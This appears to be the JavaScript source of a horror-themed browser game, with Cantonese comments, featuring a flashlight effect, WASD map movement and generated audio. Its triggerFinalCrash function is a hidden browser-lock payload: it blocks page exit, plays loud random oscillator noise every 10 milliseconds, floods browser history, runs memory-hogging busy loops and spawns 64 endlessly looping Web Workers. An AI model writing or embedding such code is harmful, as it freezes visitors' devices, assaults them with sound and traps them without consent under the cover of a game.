let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;
let systemCrashed = false;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// --- 統一啟動函式 (鍵盤或手機觸摸都會觸發呢個) ---
function startGame() {
    if (systemCrashed || audioStarted) return;
    
    // 1. 隱藏 Intro 文字
    if (intro) intro.style.display = 'none';
    
    // 2. 請求全屏 (手機必備，隱藏網址列)
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(()=>{});
    
    // 3. 啟動呼吸聲與手電筒
    startCreepyVoice();
    isLightOn = true;
    if (overlay) overlay.style.background = `radial-gradient(circle 130px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
}

// 1. 音效系統
function startCreepyVoice() {
    if (audioStarted) return;
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;

    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                output[i] = (Math.random() * 2 - 1) * 0.9;
            } else {
                let n = Math.random() * 0.1;
                let g = (t & (t >> 8)) ? 0.05 : -0.05;
                output[i] = n + g;
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
    audioStarted = true;
}

// 2. 生成 Glitch 塊 (倒數 30 秒)
setTimeout(() => {
    if (systemCrashed) return;
    const glitchBlock = document.createElement('div');
    let spawnX = -posX + (window.innerWidth / 2) + 200;
    let spawnY = -posY + (window.innerHeight / 2) + 200;

    glitchBlock.style.cssText = `
        position: absolute; width: 30px; height: 30px;
        background: white; z-index: 1001;
        left: ${spawnX}px; top: ${spawnY}px;
        box-shadow: 0 0 20px white;
    `;
    map.appendChild(glitchBlock);

    setInterval(() => {
        glitchBlock.style.background = Math.random() > 0.5 ? 'white' : 'black';
    }, 50);

    const checkArrival = setInterval(() => {
        const rect = glitchBlock.getBoundingClientRect();
        const centerX = window.innerWidth / 2;
        const centerY = window.innerHeight / 2;
        if (Math.abs(rect.left + 15 - centerX) < 40 && Math.abs(rect.top + 15 - centerY) < 40) {
            triggerFinalCrash();
            clearInterval(checkArrival);
        }
    }, 50);
}, 30000); 

// 3. 核心：極端凍結
function triggerFinalCrash() {
    systemCrashed = true;
    window.onbeforeunload = function () { return "HELP ME."; };

    document.body.innerHTML = `
        <div style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:99999; cursor:none;">
            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red;">HELP ME.</h1>
        </div>
    `;

    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});

    setTimeout(() => {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        setInterval(() => {
            let osc = audioCtx.createOscillator();
            osc.type = 'sawtooth';
            osc.frequency.value = 50 + Math.random() * 5000;
            osc.connect(audioCtx.destination);
            osc.start();
        }, 10);

        function absoluteLock() {
            for (let i = 0; i < 500; i++) {
                window.history.pushState(null, null, "#" + Math.random());
            }
            const start = Date.now();
            while (Date.now() - start < 1000) {
                const data = new Array(1000000).fill("HELP_ME_26F");
                JSON.stringify(data);
            }
            setTimeout(absoluteLock, 0);
        }

        const blobCode = `while(true){ postMessage(new Array(1000000).join("HELP_ME")); }`;
        const url = URL.createObjectURL(new Blob([blobCode], { type: 'application/javascript' }));
        for (let i = 0; i < 64; i++) { new Worker(url); }

        absoluteLock();
    }, 300);
}

// 4. 事件監聽 (電腦 & 手機通用)

// A. 針對電腦滑鼠
window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX; mouseY = e.clientY;
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 130px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
});

// B. 針對電腦鍵盤
window.addEventListener('keydown', (e) => {
    if (systemCrashed) return;
    let key = e.key.toLowerCase();
    
    if (key === 'f') startGame(); // 按 F 啟動
    
    if (key === '1') {
        isLightOn = !isLightOn;
        overlay.style.background = isLightOn ? `radial-gradient(circle 130px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)` : 'rgba(0,0,0,1)';
    }
    
    // WASD 移動
    const s = 50;
    if (key === 'w') posY += s; if (key === 's') posY -= s; if (key === 'a') posX += s; if (key === 'd') posX -= s;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});

// C. 針對手機/iPad (點擊螢幕任何地方即啟動)
window.addEventListener('touchstart', (e) => {
    startGame();
}, { once: true }); // once: true 確保唔會重複觸發

window.addEventListener('click', (e) => {
    startGame();
}, { once: true });
